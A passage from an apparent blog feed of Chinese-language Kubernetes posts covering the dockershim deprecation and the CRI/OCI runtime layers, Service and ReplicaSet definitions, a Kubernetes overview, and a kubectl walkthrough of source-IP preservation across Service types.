<p>单独用 docker 的情况，在一些公司的场景里面也是有的。一种场景是“只分不合”，把一台机器用 docker 做资源隔离，但是不需要将多容器“编排”。单独用 Kubernetes，下层不是 docker 的情况，并不算很多。</p>
<p>Kubernetes 和 docker 的关系，简单来说，有互补，也有竞争。在一般的认知中，Kubernetes 和 docker 是互补关系：</p>
<pre><code>        dockers 属于下层——容器引擎
        Kubernetes 属于上层——编排调度层。</code></pre>
<p>​</p>
<p>docker 源于 Linux Container，可以将一台机器的资源分成 N 份容器，做到资源的隔离，并将可运行的程序定义为标准的 docker image；Kubernetes 则可以把不同机器的每份容器进行编排、调度，组成分布式系统。<br>Kubernetes 和 docker 并不完全是“泾渭分明”的互补关系，它之间有重叠部分，也可以说成是竞争，主要在于几个点：</p>
<ul>
<li><p>系统三大移植资源是计算、存储、网络，从 Kubernetes 角度 docker 属于“Runtime（运行时）”，也就是计算资源；但是 docker 技术体系里面，本身也包括存储层、网络层。上下层职责的重叠，也可以看作竞争。</p>
</li>
<li><p>docker 原本有个原生的调度引擎——Swarm，几年前在调度编排领域，还是 Kubernetes、Mesos、Swarm 三者并存，Kubernetes 最终胜出，但 docker 仍有“继续向上做一层的意愿”。</p>
</li>
</ul>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/1.png" alt="avatar"></p>
<p>Kubernetes 在如何使用 docker 方面，存在争议和变数。kubernetes 1.20 ChangeLog 中所谓要废弃 docker 的传言，也是无风不起浪。换句话说，即便 Kubernetes 一直用 docker，也不是用 docker 的全部，多少是不一样的。</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/2.png" alt="avatar"></p>
<p>而且，“弃用 docker”这个词本身有多重的含义，docker 并非一个单层软件，Kubernetes 1.20 弃用 dockershim 并不代表弃用了 docker 的全部，仍有 containerd 可以对接 docker。</p>
<h2 id="Kubernetes-有-CRI、OCI-两个容器标准"><a href="#Kubernetes-有-CRI、OCI-两个容器标准" class="headerlink" title="Kubernetes 有 CRI、OCI 两个容器标准"></a>Kubernetes 有 CRI、OCI 两个容器标准</h2><p>在目前广泛使用 kubernetes 与 Runtime 的桥接方案，CRI（Container Runtime Interface）与 OCI（Open Container Initiative）是“套娃“关系。Kubernetes 的 kubelet 调用 CRI，OCI 的实现者然后再调用 OCI。</p>
<p>下图也说明了 CRI 与 OCI 的关系：</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/3.jpg" alt="avatar"></p>
<p>从 Kubernetes 的角度，CRI 是与 CNI（网络）、CSI（存储）相同层级的接口。</p>
<ul>
<li>OCI 是个自下而上的标准，也就是从实现抽象出接口，它是 Linux Foundation 主导的。docker 实现的核心 RunC，也就是 OCI 的典型实现、标准实现。</li>
<li>CRI 是个自上而下的标准，源于 Kubernetes 对移植层（运行时）的要求。</li>
</ul>
<p>容器引擎层自下而上定义 OCI，容器编排层自上而下定义 CRI，这也让它们出现了“套娃“运行情况。</p>
<p>在 Kubernetes 的 dockershim、cri-containerd、cri-o 三种实现中，RedHat 推崇的 cri-o 已经比较主流，它虽然仍是“套娃“，但已经比较精简。</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/4.jpg" alt="avatar"></p>
<p>下面是从 kubernetes 集群运行的全景图看 cri-o 的位置：</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/5.jpg" alt="avatar"></p>
<h2 id="docker-本源于-Linux-Container"><a href="#docker-本源于-Linux-Container" class="headerlink" title="docker 本源于 Linux Container"></a>docker 本源于 Linux Container</h2><p>docker 作为容器引擎，其实现的基础是 Linux Container——从内核到用户空间的机制。Linux Container 可以分成两个部分，内核里面的 cgroup，用户空间的 lxc。docker 最初实现的时候，也是完全基于 Linux Container 的，基于 lxc 做更上层的东西。这张很多人认为“与事实不符“的图，其实代表了过去：</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/6.jpg" alt="avatar"></p>
<p>在 docker 的发展过程中，最终弃用了 C 语言写成 lxc，换成了 go 语言写成的 libcontainer。下面的图也不是很新，但它更能表示 docker 后续典型的架构，这里面已经没有了 lxc。</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/7.jpg" alt="avatar"></p>
<p>然而，万变不离其宗，docker 实现的本源，还是 Linux Container。即便不用 lxc，当仍要用内核的 cgroup，并且模式也是类似的。</p>
<h2 id="Kubernetes-最终如何桥接容器"><a href="#Kubernetes-最终如何桥接容器" class="headerlink" title="Kubernetes 最终如何桥接容器"></a>Kubernetes 最终如何桥接容器</h2><p>从纯技术的角度，与其讨 Kubernetes 与 docker 关系，不如讨论 Kubernetes 与最终容器实现层的关系。因为 docker 这个名词，在不同的时候，有着不同的内涵、外延。</p>
<p>下面是 docker 的简图：</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/8.jpg" alt="avatar"></p>
<p>从软件模块的角度，图中的 docker Engine、cri-containd、containd-shim、runC 都属于 docker 体系的软件。</p>
<p>下图中的紫、橙、红三种颜色，代表了 dockershim、cri-containerd、cri-o 三种 CRI 的典型方式——流程在逐渐缩短，这也是 CRI 实现的一个演进过程。</p>
<p><img src="/2021/01/04/Kubernetes-%E5%BC%83%E7%94%A8Docker/9.jpg" alt="avatar"></p>
<p>1、 如果是 kubelet 的 dockershim 模式（紫色），流程是这样的：</p>
<ul>
<li>1.kubelet 从 CRI 的 gRPC 调用 dockershim，二者在同一个进程</li>
<li>2.dockershim 调用 docker 守护进程</li>
<li>3.docker 守护进程调用 containerd；containerd 调用 containerd-shim（有时名为 docker-containerd-shim 守护进程）完成创建容器等操作</li>
<li>4.containerd-shim 访问 OCI 的实现 runC（命令行可执行程序）<br>​</li>
</ul>
<p>2、 如果是 kubelet 的 cri-containerd 模式（橙色），流程是这样的：</p>
<ul>
<li>1.kubelet 从 CRI 的 gRPC 调用 cri-containerd；</li>
<li>2.cri-containerd 调用 containerd；containerd 调用 containerd-shim（同上）</li>
<li>3.containerd-shim 调用 RucnC （同上）<br>​</li>
</ul>
<p>在很多人的印象中，如果不用 docker 守护进程，就相当于“弃用 docker“，这其实也就是从 dockershim 到 containerd 的变化。从另一个角度来说，containerd 这个守护进程，也是 docker 组织做的。</p>
<p>3、 如果是 kubelet 的 cri-o 模式（红色），则更加简练：</p>
<ul>
<li>1.kubelet 从 CRI 的 gRPC 调用 cri-o；</li>
<li>2.cri-o 调用 OCI 的实现 runC<br>​</li>
</ul>
<p>如果以 kubelet 调用 CRI 为起点，OCI 的 runC 调用为终点，三种模式经历的可执行程序分别是：</p>
<ul>
<li>dockershim 模式：dockershim(*)-&gt;dockd-&gt;containerd-&gt;containerd-shim</li>
<li>cri-containerd 模式：cri-containerd(*)-&gt; containerd-&gt;containerd-shim</li>
<li>cri-o 模式：cri-o<br>​<br>dockershim 模式有 3 个可执行程序，dockershim 一般与 kubelet 同进程；cri-containerd 模式有 2-3 个可执行程序，cri-containerd 可与 containerd 同进程；cri-o 模式只有 1 个可执行程序。</li>
</ul>
<p>显然在这种 Red Hat 推崇的 cri-o 模式下，docker 体系的 containerd 也用不着了，只剩 runC 这个命令行的程序。runC 也是用 go 写成的，里面有调用 libcontainer。</p>
<p>当 docker 萎缩到这个地步，其实也只剩 Linux 内核里面 cgroup、namespace 功能的封装了。</p>
<p>总结来说，由于老技术实现的惯性，在生产环境大量使用的经典 Kubernetes+ docker 方案依然运行，且运维已经成熟，不会很快升级。对于开发人员、企业，对于 K8S API 的使用频率、变数，远远大于 docker API，至于 Kubernetes 和 docker 的桥接，更不用关心。因此，即便“彻底弃用 docker”，对开发者与企业的影响也非常有限。</p>
]]></content>
  </entry>
  <entry>
    <title>Kubernetes 详解-Replica Sets 和Service</title>
    <url>/2020/09/21/Kubernetes-%E8%AF%A6%E8%A7%A3-Replica-Sets-%E5%92%8CService/</url>
    <content><![CDATA[<h2 id="1-1-Replica-Sets"><a href="#1-1-Replica-Sets" class="headerlink" title="1.1 Replica Sets"></a>1.1 Replica Sets</h2><p>下一代的Replication Controller，两者的区别主要在选择器selector,Replica 支持集合级别的选择器，而前期的Replication Controller，支持在等号描述的选择器，kubectl命令支持使用replica sets （目前kubectl命令中的rolling-update 还不支持），目前replica sets主要用于deployment中</p>
<p>Replica Sets 能够确保在某个时间点上，一定数量的Pod在运行。然而Deployment 是Replica Sets更高一层的抽象，用于更新Pods 以及其他一些特性。推荐使用Deployment而不是直接使用Replica Set进行编排Pods。</p>
<h2 id="1-2-Service"><a href="#1-2-Service" class="headerlink" title="1.2 Service"></a>1.2 Service</h2><p>由于Pod的IP会变化，提供某些功能的POD如果IP发生变化，会导致其他Pod无法发现这些功能，因此 引入了Service的功能。</p>
<p>Service是一组逻辑Pod的抽象，定义了一个访问这些Pod的策略（或者叫做微服务），这些Service 通常通过Label Selector指向这些Pod。</p>
<p>举个例子：一个提供镜像处理的后端有三个运行的副本，这些副本是可以取代的，但是前端并不需要感知，这时就需要Service作为抽象</p>
<p>对于可以部署在K8s内部应用，K8s通过Endpoints Api更新Service对应的Pod集合，对于那些没K8s外部的应用，K8s提供了虚拟IP桥接到Service，然后Service重定向到Pod集合。</p>
<h3 id="1-2-1-Service-定义"><a href="#1-2-1-Service-定义" class="headerlink" title="1.2.1 Service 定义"></a>1.2.1 Service 定义</h3><p><strong>{</strong></p>
<p> <strong>“kind”**</strong>:**  <strong>“Service”**</strong>,**</p>
<p> <strong>“apiVersion”**</strong>:**  <strong>“v1”**</strong>,**</p>
<p> <strong>“metadata”**</strong>:**  <strong>{</strong></p>
<p> <strong>“name”**</strong>:**  <strong>“my-service”</strong></p>
<p> <strong>},</strong></p>
<p> <strong>“spec”**</strong>:**  <strong>{</strong></p>
<p> <strong>“selector”**</strong>:**  <strong>{</strong></p>
<p> <strong>“app”**</strong>:**  <strong>“MyApp”</strong></p>
<p> <strong>},</strong></p>
<p> <strong>“ports”**</strong>:**  <strong>[</strong></p>
<p> <strong>{</strong></p>
<p> <strong>“protocol”**</strong>:**  <strong>“TCP”**</strong>,**</p>
<p> <strong>“port”**</strong>:**  <strong>80**</strong>,**</p>
<p> <strong>“targetPort”**</strong>:**  <strong>9376</strong></p>
<p> <strong>}</strong></p>
<p> <strong>]</strong></p>
<p> <strong>}</strong></p>
<p><strong>}</strong></p>
<p>该Service 对应的Pod集合：带有label app=Myapp，对外暴露端口9376</p>
<p>Service 能将任意的流入Port 重定向到targetPort,默认情况下，targetPort和Port为相同值，不同的Pod 可以对应不同的端口号（例如，在你应用的下一个版本中会使用不同的端口号，但是并不应用之前版本的使用）</p>
<p>Service 支持UDP和TCP，默认是TCP</p>
<h3 id="1-2-2-Service-without-selector"><a href="#1-2-2-Service-without-selector" class="headerlink" title="1.2.2 Service without selector"></a>1.2.2 Service without selector</h3><p>Service可以抽象访问Pod集群，同时 Service也可以抽象其他后端</p>
<p>1、 在生产环境中使用外部数据库，在测试环境中使用自己的数据库</p>
<p>2、 将自己的Service指向其他集群或者其他命名空间的Service</p>
<p>3、 迁移应用到k8s，但是还是有些应用运行在k8s之外</p>
<p>通过定义不包含selector的Service实现</p>
<p><strong>{</strong></p>
<p> <strong>“kind”**</strong>:**  <strong>“Service”**</strong>,**</p>
<p> <strong>“apiVersion”**</strong>:**  <strong>“v1”**</strong>,**</p>
<p> <strong>“metadata”**</strong>:**  <strong>{</strong></p>
<p> <strong>“name”**</strong>:**  <strong>“my-service”</strong></p>
<p> <strong>},</strong></p>
<p> <strong>“spec”**</strong>:**  <strong>{</strong></p>
<p> <strong>“ports”**</strong>:**  <strong>[</strong></p>
<p> <strong>{</strong></p>
<p> <strong>“protocol”**</strong>:**  <strong>“TCP”**</strong>,**</p>
<p> <strong>“port”**</strong>:**  <strong>80**</strong>,**</p>
<p> <strong>“targetPort”**</strong>:**  <strong>9376</strong></p>
<p> <strong>}</strong></p>
<p><strong>]</strong></p>
<p> <strong>}</strong></p>
<p><strong>}</strong></p>
<p>Service 没有Selector，K8s不会创建Endpoints，你可以通过手动创建Endpoint指向自己的endpoint</p>
<p><strong>{</strong></p>
<p> <strong>“kind”**</strong>:**  <strong>“Endpoints”**</strong>,**</p>
<p> <strong>“apiVersion”**</strong>:**  <strong>“v1”**</strong>,**</p>
<p> <strong>“metadata”**</strong>:**  <strong>{</strong></p>
<p> <strong>“name”**</strong>:**  <strong>“my-service”</strong></p>
<p> <strong>},</strong></p>
<p> <strong>“subsets”**</strong>:**  <strong>[</strong></p>
<p> <strong>{</strong></p>
<p> <strong>“addresses”**</strong>:**  <strong>[</strong></p>
<p> <strong>{</strong>  <strong>“ip”**</strong>:**  <strong>“1.2.3.4”</strong>  <strong>}</strong></p>
<p> <strong>],</strong></p>
<p> <strong>“ports”**</strong>:**  <strong>[</strong></p>
<p> <strong>{</strong>  <strong>“port”**</strong>:**  <strong>9376</strong>  <strong>}</strong></p>
<p> <strong>]</strong></p>
<p> <strong>}</strong></p>
<p> <strong>]</strong></p>
<p><strong>}</strong></p>
<p>Endpoint的IP不能是loopback（127.0.0.1/8），link-local（169.254.0.0/16）, link-local multicast (224.0.0.0/24).</p>
<p>访问不含有selector的Service和访问含有Selector的Service 方式一样，都会讲流向重定向的endpoint</p>
<p> 其他命名空间的服务是一个特例，他不会定义ports和endpoint，他只是返回一个访问外部服务的别名</p>
<p><strong>{</strong></p>
<p> <strong>“kind”**</strong>:**  <strong>“Service”**</strong>,**</p>
<p> <strong>“apiVersion”**</strong>:**  <strong>“v1”**</strong>,**</p>
<p> <strong>“metadata”**</strong>:**  <strong>{</strong></p>
<p> <strong>“name”**</strong>:**  <strong>“my-service”**</strong>,**</p>
<p> <strong>“namespace”**</strong>:**  <strong>“prod”</strong></p>
<p> <strong>},</strong></p>
<p> <strong>“spec”**</strong>:**  <strong>{</strong></p>
<p> <strong>“type”**</strong>:**  <strong>“ExternalName”**</strong>,**</p>
<p> <strong>“externalName”**</strong>:**  <strong>“my.database.example.com”</strong></p>
<p> <strong>}</strong></p>
<p><strong>}</strong></p>
<p>当你访问服务<strong>my-service.prod.svc.CLUSTER**</strong>时，**<strong>cluster**</strong>的**<strong>dns**</strong>服务会返回记录**<strong>my.database.example.com</strong> <strong>的**</strong>CNAME**<strong>，这个重定向是发生在**</strong>dns**<strong>解析阶段。</strong></p>
<h3 id="1-2-3-虚拟IP-和服务代理"><a href="#1-2-3-虚拟IP-和服务代理" class="headerlink" title="1.2.3 虚拟IP 和服务代理"></a>1.2.3 虚拟IP 和服务代理</h3><h4 id="1-2-3-1-代理"><a href="#1-2-3-1-代理" class="headerlink" title="1.2.3.1 代理"></a>1.2.3.1 代理</h4><p>K8s集群内每个节点都会运行kube-proxy，负责实现服务的虚拟机IP（不是externalName）。1.0版本的代理模式在是userspace，1.1增加了iptables proxy，从1.2开始 iptables 代理是默认的模式</p>
<p>K8s 1.0的service是四层（TCP/UDP），从k8s1.1开始，增加了Ingress，实现七层（HTTP）服务</p>
<p><strong>用户空间的代理模式</strong></p>
<p>Kube-proxy监控k8s master节点来发现Service、Endpointd的增加和删除，对于Service，在本地打开一个随机端口作为代理端口，任何访问改代理端口的连接都会被指向Service对象的Pod集合，最终指向哪个Pod取决于Service的SessionAffinity，最后，他会配置iptables，捕获流向Service 的Cluster IP 和Port的连接，并重定向到这个代理端口。</p>
<p>最终结果，任何到Service Cluster Ip 和port的流量都会指向合适的Pod</p>
<p>默认情况下，都是轮训算法选择后端，也可以通过设置service.spec.sessionAffinity 为ClientIP，将选择算法改为Client-IP based session affinity</p>
<p><strong>Iptables**</strong>的代理模式**</p>
<p>该模式与userspace模式类似，只是没有这个代理端口</p>
<p>比userspace方式更快更可靠，然后与userspace方式不同，当选择的pod异常时，该方式无法自动尝试选择其他Pod。</p>
<p>1、userspace模式只不适合大规模集群使用（数千个服务）</p>
<p>2、userspace模式隐藏了访问服务的源IP，iptables模式虽然没有隐藏源IP，但是也是通过负载均衡或者nodeport 影响了客户端输入</p>
]]></content>
      <tags>
        <tag>Kubernetes</tag>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes 详解--简介</title>
    <url>/2020/09/21/Kubernetes-%E8%AF%A6%E8%A7%A3-%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>K8s 开源平台：跨集群主机的自动化部署、伸缩、应用管理，提供以容器为中心的基础设施。</p>
<p>1、迅速部署应用或者定时部署</p>
<p>2、伸缩应用</p>
<p>3、无缝升级回滚应用</p>
<p>4、最大化利用硬件资源（每个应用只分配它所需要的资源）</p>
<p>容器相对于虚拟机的优势：</p>
<p>1、应用的敏捷创建和部署：得益于容器镜像的轻量级</p>
<p>2、持续的部署、集成、部署：提供可靠搞笑的容器镜像制作和部署，易于回滚(基于镜像部署时，镜像并不会改变)</p>
<p>3、Dev和ops 分离：在编译发布阶段创建容器镜像，而不是在部署阶段。能够将应用的运行和基础设施分离</p>
<p>4、开发、测试、生产三种场景，可以在笔记本也可以在公有云</p>
<p>5、不感知操作系统：Centos、Ubuntu，各种容器引擎，都可以。</p>
<p>6、以应用为中心的管理：不感知底层资源（基于虚拟机还是物理机）</p>
<p>7、松散，分布式、弹性、无约束的微服务</p>
<p>8、资源隔离：应用性能可以预测</p>
<p>9、资源利用率：高效率和密集度的资源利用</p>
<p>Kubernets可以将运行在物理或者虚拟机集群，可以将应用从主机架构的基础设施迁移到以容器为中心的基础设施。Kubernets 主要是构建以容器为中心的基础设施。Kubernets满足了将应用运行到生产环境的大部分需求：</p>
<p>1、容器级别的进程协作:组合复杂应用，同时保留 一个应用一个容器的模型，参考Kubernets POD的概念</p>
<p>2、挂载存储</p>
<p>3、密钥管理</p>
<p>4、应用健康检查</p>
<p>5、水平弹性伸缩</p>
<p>6、命名和服务发现</p>
<p>7、负载均衡</p>
<p>8、滚动升级</p>
<p>9、资源监控</p>
<p>10、日志收集</p>
<p>11、<a href="http://kubernetes.io/docs/user-guide/introspection-and-debugging/" target="_blank" rel="noopener">support for introspection and debugging</a></p>
<p>12、认证和权限控制</p>
<p>l  Kubernets 不是一个传统的，全部包含的Paas。K8s不限制运行在k8s的应用运行环境，不区分应用和服务这两个概念。K8s目标是能够支持极端多样的负载，包含无状态、有状态、数据处理流。如果一个应用能够运行在Container，那么它就能够运行在K8s</p>
<p>l  K8s不提供中间件服务，消息中间件，数据处理框架、数据库，不提供集群存储并不会内置到K8s，但是这些服务可以运行到K8s</p>
<p>l  K8s 不提供一键部署的Service Market</p>
<p>l  K8s 不会部署源码，不会build 应用。CI因人而已</p>
<p>l  K8s 允许用户选择日志，监控，告警</p>
<p>l  K8s 没有提供，也没有强制一个综合的应用管理系统</p>
<p>l  K8s 没有提供也没有采用任何复杂的集群配置、维护、管理、自愈系统</p>
<p>K8s主要进行应用级别的管理，提供一些通用的应用管理特性：部署、扩容、负载均衡、日志、监控。然而k8s并不是单一的整理，这些默认的解决方案都是可选，可插拔的</p>
]]></content>
      <tags>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes中的Source Ip机制</title>
    <url>/2020/09/21/Kubernetes%E4%B8%AD%E7%9A%84Source-Ip%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>你必须拥有一个正常工作的 Kubernetes 1.5 集群，用来运行本文中的示例。该示例使用一个简单的 nginx webserver 回送它接收到的请求的 HTTP 头中的源 IP 地址。你可以像下面这样创建它：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl run source-ip-app --image&#x3D;k8s.gcr.io&#x2F;echoserver:1.4</span><br><span class="line">deployment &quot;source-ip-app&quot; created</span><br></pre></td></tr></table></figure>

<h2 id="Type-ClusterIP-类型-Services-的-Source-IP"><a href="#Type-ClusterIP-类型-Services-的-Source-IP" class="headerlink" title="Type=ClusterIP 类型 Services 的 Source IP"></a>Type=ClusterIP 类型 Services 的 Source IP</h2><p>如果你的 kube-proxy 运行在 iptables 模式下，从集群内部发送到 ClusterIP 的包永远不会进行源地址 NAT，这从 Kubernetes 1.2 开始是默认选项。Kube-proxy 通过一个 proxyMode endpoint 暴露它的模式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl get nodes</span><br><span class="line">NAME                           STATUS     AGE     VERSION</span><br><span class="line">kubernetes-minion-group-6jst   Ready      2h      v1.6.0+fff5156</span><br><span class="line">kubernetes-minion-group-cx31   Ready      2h      v1.6.0+fff5156</span><br><span class="line">kubernetes-minion-group-jj1t   Ready      2h      v1.6.0+fff5156</span><br><span class="line">kubernetes-minion-group-6jst $ curl localhost:10249&#x2F;proxyMode</span><br><span class="line">iptables</span><br></pre></td></tr></table></figure>

<p>你可以通过在 source IP 应用上创建一个服务来测试源 IP 保留。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl expose deployment source-ip-app --name&#x3D;clusterip --port&#x3D;80 --target-port&#x3D;8080</span><br><span class="line">service &quot;clusterip&quot; exposed</span><br><span class="line"></span><br><span class="line">$ kubectl get svc clusterip</span><br><span class="line">NAME         CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE</span><br><span class="line">clusterip    10.0.170.92   &lt;none&gt;        80&#x2F;TCP    51s</span><br><span class="line">&#96;&#96;</span><br></pre></td></tr></table></figure>

<p>从相同集群中的一个 pod 访问这个 ClusterIP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl run busybox -it --image&#x3D;busybox --restart&#x3D;Never --rm</span><br><span class="line">Waiting for pod default&#x2F;busybox to be running, status is Pending, pod ready: false</span><br><span class="line">If you don&#39;t see a command prompt, try pressing enter.</span><br><span class="line"># ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER\_UP&gt; mtu 65536 qdisc noqueue</span><br><span class="line">    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1&#x2F;8 scope host lo</span><br><span class="line">       valid\_lft forever preferred\_lft forever</span><br><span class="line">    inet6 ::1&#x2F;128 scope host</span><br><span class="line">       valid\_lft forever preferred\_lft forever</span><br><span class="line">3: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER\_UP&gt; mtu 1460 qdisc noqueue</span><br><span class="line">    link&#x2F;ether 0a:58:0a:f4:03:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.244.3.8&#x2F;24 scope global eth0</span><br><span class="line">       valid\_lft forever preferred\_lft forever</span><br><span class="line">    inet6 fe80::188a:84ff:feb0:26a5&#x2F;64 scope link</span><br><span class="line">       valid\_lft forever preferred\_lft forever</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># wget -qO - 10.0.170.92</span><br><span class="line">CLIENT VALUES:</span><br><span class="line">client\_address&#x3D;10.244.3.8</span><br><span class="line">command&#x3D;GET</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>如果客户端 pod 和 服务端 pod 在相同的节点上，client_address 就是客户端 pod 的 IP 地址。但是，如果它们在不同的节点上， client_address 将会是客户端 pod 所在节点的 flannel IP 地址。</p>
<h2 id="Type-NodePort-类型-Services-的-Source-IP"><a href="#Type-NodePort-类型-Services-的-Source-IP" class="headerlink" title="Type=NodePort 类型 Services 的 Source IP"></a>Type=NodePort 类型 Services 的 Source IP</h2><p>      对于 Kubernetes 1.5，发送给类型为 Type=NodePort Services 的数据包默认进行源地址 NAT。你可以创建一个 NodePort Service 来进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl expose deployment source-ip-app --name&#x3D;nodeport --port&#x3D;80 --target-port&#x3D;8080 --type&#x3D;NodePort</span><br><span class="line">service &quot;nodeport&quot; exposed</span><br><span class="line">$ NODEPORT&#x3D;$(kubectl get -o jsonpath&#x3D;&quot;&#123;.spec.ports\[0\].nodePort&#125;&quot; services nodeport)</span><br><span class="line">$ NODES&#x3D;$(kubectl get nodes -o jsonpath&#x3D;&#39;&#123; $.items\[\*\].status.addresses\[?(@.type&#x3D;&#x3D;&quot;ExternalIP&quot;)\].address &#125;&#39;)</span><br></pre></td></tr></table></figure>

<p>如果你的集群运行在一个云服务上，你可能需要为上面报告的 nodes:nodeport 开启一条防火墙规则。 现在，你可以通过上面分配的节点端口从外部访问这个 Service。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ for node in $NODES; do curl -s $node:$NODEPORT | grep -i client\_address; done</span><br><span class="line">client\_address&#x3D;10.180.1.1</span><br><span class="line">client\_address&#x3D;10.240.0.5</span><br><span class="line">client\_address&#x3D;10.240.0.3</span><br></pre></td></tr></table></figure>

<p>请注意，这些并不是正确的客户端 IP，它们是集群的内部 IP。这是所发生的事情：</p>
<p>1、客户端发送数据包到 node2:nodePort</p>
<p>2、node2 使用它自己的 IP 地址替换数据包的源 IP 地址（SNAT）</p>
<p>3、node2 使用 pod IP 地址替换数据包的目的 IP 地址</p>
<p>4、数据包被路由到 node 1，然后交给 endpoint</p>
<p>5、Pod 的回复被路由回 node2</p>
<p>6、Pod 的回复被发送回给客户端</p>
<p>形象的：<br> <img src="/2020/09/21/Kubernetes%E4%B8%AD%E7%9A%84Source-Ip%E6%9C%BA%E5%88%B6/1526621848885868.png" alt="avatar"></p>
<p>      为了防止这种情况发生，Kubernetes 提供了一个特性来保留客户端的源 IP 地址(点击此处查看可用特性)。设置 service.spec.externalTrafficPolicy 的值为 Local，请求就只会被代理到本地 endpoints 而不会被转发到其它节点。这样就保留了最初的源 IP 地址。如果没有本地 endpoints，发送到这个节点的数据包将会被丢弃。这样在应用到数据包的任何包处理规则下，你都能依赖这个正确的 source-ip 使数据包通过并到达 endpoint。</p>
<p>   设置 service.spec.externalTrafficPolicy 字段如下：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl patch svc nodeport -p &#39;&#123;&quot;spec&quot;:&#123;&quot;externalTrafficPolicy&quot;:&quot;Local&quot;&#125;&#125;&#39;</span><br><span class="line">service &quot;nodeport&quot; patched</span><br></pre></td></tr></table></figure>

<p>现在，重新运行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ for node in $NODES; do curl --connect-timeout 1 -s $node:$NODEPORT | grep -i client\_address; done</span><br><span class="line">client\_address&#x3D;104.132.1.79</span><br></pre></td></tr></table></figure>

<p>   请注意，你只从 endpoint pod 运行的那个节点得到了一个回复，这个回复有*正确的*客户端 IP。</p>
<p>这是发生的事情：</p>
<p>1、客户端发送数据包到 node2:nodePort，它没有任何 endpoints</p>
<p>2、数据包被丢弃</p>
<p>3、客户端发送数据包到 node1:nodePort，它*有*endpoints</p>
<p>4、node1 使用正确的源 IP 地址将数据包路由到 endpoint</p>
<p>形象的：<br> <img src="/2020/09/21/Kubernetes%E4%B8%AD%E7%9A%84Source-Ip%E6%9C%BA%E5%88%B6/1526622213101501.png" alt="avatar"></p>
<h2 id="Type-LoadBalancer-类型-Services-的-Source-IP"><a href="#Type-LoadBalancer-类型-Services-的-Source-IP" class="headerlink" title="Type=LoadBalancer 类型 Services 的 Source IP"></a>Type=LoadBalancer 类型 Services 的 Source IP</h2><p>      对于 Kubernetes 1.5，发送给类型为 Type=LoadBalancer Services 的数据包默认进行源地址 NAT，这是由于所有处于 Ready 状态的 Kubernetes 节点对于负载均衡的流量都是符合条件的。所以如果数据包到达一个没有 endpoint 的节点，系统将把这个包代理到有 endpoint 的节点，并替换数据包的源 IP 为节点的 IP（如前面章节所述）。</p>
<p>    你可以通过在一个 loadbalancer 上暴露这个 source-ip-app 来进行测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl expose deployment source-ip-app --name&#x3D;loadbalancer --port&#x3D;80 --target-port&#x3D;8080 --type&#x3D;LoadBalancer</span><br><span class="line">service &quot;loadbalancer&quot; exposed</span><br><span class="line">$ kubectl get svc loadbalancer</span><br><span class="line">NAME           CLUSTER-IP    EXTERNAL-IP       PORT(S)   AGE</span><br><span class="line">loadbalancer   10.0.65.118   104.198.149.140   80&#x2F;TCP    5m</span><br><span class="line">$ curl 104.198.149.140</span><br><span class="line">CLIENT VALUES:</span><br><span class="line">client\_address&#x3D;10.240.0.5</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>      然而，如果你的集群运行在 Google Kubernetes Engine/GCE 上，设置 service.spec.externalTrafficPolicy 字段值为 Local 可以强制使没有 endpoints 的节点把他们自己从负载均衡流量的可选节点名单中删除。这是通过故意使它们健康检查失败达到的。</p>
<p>形象的：<br> <img src="/2020/09/21/Kubernetes%E4%B8%AD%E7%9A%84Source-Ip%E6%9C%BA%E5%88%B6/1526622380157076.png" alt="avatar"></p>
<p>你可以设置 annotation 来进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl patch svc loadbalancer -p &#39;&#123;&quot;spec&quot;:&#123;&quot;externalTrafficPolicy&quot;:&quot;Local&quot;&#125;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>你应该能够立即看到 Kubernetes 分配的 service.spec.healthCheckNodePort 字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ kubectl get svc loadbalancer -o yaml | grep -i healthCheckNodePort</span><br><span class="line">  healthCheckNodePort: 32122</span><br></pre></td></tr></table></figure>

<p>service.spec.healthCheckNodePort 字段指向每个节点在 /healthz 路径上提供的用于健康检查的端口。你可以这样测试：</p>
